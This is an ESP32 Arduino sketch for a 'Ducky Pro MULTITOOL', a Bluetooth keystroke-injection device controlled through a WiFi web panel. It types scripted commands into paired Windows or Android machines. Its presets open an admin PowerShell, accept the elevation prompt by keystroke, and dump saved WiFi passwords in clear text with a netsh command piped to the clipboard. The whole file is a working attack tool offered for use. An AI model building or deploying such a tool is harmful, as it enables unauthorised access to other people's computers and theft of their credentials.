#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <HijelHID_BLEKeyboard.h>

const char* ssid = "Pro_pass123";
const char* wifi_pass = "pass123";

HijelHID_BLEKeyboard keyboard("Ducky Pro MULTITOOL", "Ducky", 100);

WebServer server(80);
DNSServer dnsServer;

String monitorLog = "MULTITOOL READY";
String scriptQueue = "";
bool processingScript = false;
String lastAction = "";

// ================== FIXED MULTITOOL INTERPRETER ==================
void executeLine(String line) {
    line.trim();
    if (line.length() == 0 || line.startsWith("REM")) return;

    lastAction = line;
    monitorLog = "EXEC: " + line;

    // ================== WINDOWS ==================
    if (line == "ADMIN_TERMINAL") {
        keyboard.press((uint8_t)KEY_LGUI); keyboard.tap((uint8_t)'r'); keyboard.releaseAll();
        delay(600); keyboard.print("powershell"); delay(200);
        keyboard.press((uint8_t)KEY_LCTRL); keyboard.press((uint8_t)KEY_LSHIFT);
        keyboard.tap((uint8_t)KEY_RETURN); keyboard.releaseAll();
        delay(2500);
        keyboard.tap((uint8_t)KEY_LEFT); delay(200); keyboard.tap((uint8_t)KEY_RETURN);
    }
    else if (line == "SCREENSHOT_WIN") {
        keyboard.press((uint8_t)KEY_LGUI);
        keyboard.press((uint8_t)KEY_LSHIFT);
        keyboard.tap((uint8_t)'s');
        keyboard.releaseAll();
    }
    else if (line == "PASSWORD_DUMP") {
        keyboard.press((uint8_t)KEY_LGUI); keyboard.tap((uint8_t)'r'); keyboard.releaseAll();
        delay(500); keyboard.print("powershell"); keyboard.tap((uint8_t)KEY_RETURN);
        delay(800);
        keyboard.print("netsh wlan show profile name=* key=clear | clip");
        keyboard.tap((uint8_t)KEY_RETURN);
    }
    else if (line == "LOCK_PC") {
        keyboard.press((uint8_t)KEY_LGUI); keyboard.tap((uint8_t)'l'); keyboard.releaseAll();
    }

    // ================== ANDROID ==================
    else if (line == "SCREENSHOT_ANDROID") {
        keyboard.press((uint8_t)MEDIA_VOLUME_DOWN);
        keyboard.press((uint8_t)KEY_POWER);
        delay(300);
        keyboard.releaseAll();
    }
    else if (line == "NOTIF_ANDROID") {
        keyboard.press((uint8_t)MEDIA_VOLUME_DOWN);
        keyboard.press((uint8_t)KEY_POWER);
        delay(100);
        keyboard.releaseAll();
    }
    else if (line == "HOME_ANDROID") {
        keyboard.tap((uint8_t)KEY_HOME);
    }
    else if (line == "BACK_ANDROID") {
        keyboard.tap((uint8_t)KEY_ESCAPE);   // FIXED: was KEY_ESC
    }

    // ================== COMMON ==================
    else if (line.startsWith("STRING ")) keyboard.print(line.substring(7));
    else if (line.startsWith("DELAY ")) delay(line.substring(6).toInt());
    else if (line == "ENTER") keyboard.tap((uint8_t)KEY_RETURN);
    else if (line == "SPACE") keyboard.tap((uint8_t)' ');
    else if (line.startsWith("REPEAT ")) {
        int sp = line.indexOf(' ', 7);
        if (sp > 0) {
            int times = line.substring(7, sp).toInt();
            String cmd = line.substring(sp + 1);
            for(int i = 0; i < times && i < 10; i++) {
                executeLine(cmd);
                delay(180);
            }
        }
    }
}

void setup() {
    Serial.begin(115200);
    keyboard.setTxPower(8);
    keyboard.setBatteryLevel(100);
    keyboard.begin();

    WiFi.softAP(ssid, wifi_pass);
    dnsServer.start(53, "*", WiFi.softAPIP());

    server.on("/", HTTP_GET, []() {
        const char* html = R"rawliteral(
<!DOCTYPE html><html><head><title>Ducky MULTITOOL</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{font-family:Courier New,monospace;background:#0a0a0a;color:#0f0;padding:15px;text-align:center;}
  .screen{border:2px solid #0f0;background:#000;padding:12px;height:160px;overflow-y:auto;text-align:left;margin:10px 0;font-size:14px;}
  textarea{width:95%;height:280px;background:#111;color:#0f0;border:1px solid #0f0;padding:12px;font-family:monospace;resize:vertical;}
  .btn{width:100%;padding:15px;margin:5px 0;background:#222;color:#0f0;border:1px solid #0f0;cursor:pointer;font-weight:bold;}
  .btn:active{background:#0f0;color:#000;}
</style></head>
<body>
    <h3>DUCKY PRO MULTITOOL</h3>
    <div style="display:flex;justify-content:space-between;margin:8px 0;">
        <span id="bt-stat">BT: INITIALIZING...</span>
        <span>IP: 192.168.4.1</span>
    </div>
    <div class="screen" id="mon">LOG: Ready...</div>
    <div class="screen" id="live">LAST: None</div>
    
    <textarea id="script">ADMIN_TERMINAL
DELAY 1500
STRING Ducky Pro Multitool Active!
ENTER</textarea>

    <button class="btn" onclick="run()">RUN CUSTOM SCRIPT</button>
    <button class="btn" onclick="preset('SCREENSHOT_WIN')">📸 Win Screenshot</button>
    <button class="btn" onclick="preset('SCREENSHOT_ANDROID')">📱 Android Screenshot</button>
    <button class="btn" onclick="preset('PASSWORD_DUMP')">🔑 WiFi Passwords</button>
    <button class="btn" onclick="preset('NOTIF_ANDROID')">🔔 Android Notifications</button>

    <script>
      function run(){ fetch('/run',{method:'POST',body:document.getElementById('script').value}); }
      function preset(cmd){ fetch('/run',{method:'POST',body:cmd}); }
      
      setInterval(() => {
        fetch('/status').then(r => r.json()).then(d => {
            document.getElementById('mon').innerText = "LOG: " + d.log;
            document.getElementById('live').innerText = "LAST: " + (d.lastAction || "None");
        });
      }, 700);
    </script>
</body></html>)rawliteral";
        server.send(200, "text/html", html);
    });

    server.on("/status", []() {
        String json = "{\"log\":\"" + monitorLog + "\",\"lastAction\":\"" + lastAction + "\"}";
        server.send(200, "application/json", json);
    });

    server.on("/run", HTTP_POST, []() {
        scriptQueue = server.arg("plain");
        processingScript = true;
        server.send(200, "text/plain", "OK");
    });

    server.onNotFound([]() {
        server.sendHeader("Location", "/", true);
        server.send(302, "text/plain", "");
    });

    server.begin();
    monitorLog = "Multitool Ready - Windows & Android";
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();

    if (processingScript && scriptQueue.length() > 0) {
        int idx = scriptQueue.indexOf('\n');
        String line = (idx != -1) ? scriptQueue.substring(0, idx) : scriptQueue;
        
        if (idx != -1) scriptQueue = scriptQueue.substring(idx + 1);
        else { scriptQueue = ""; processingScript = false; }

        executeLine(line);
        delay(80);
    }
}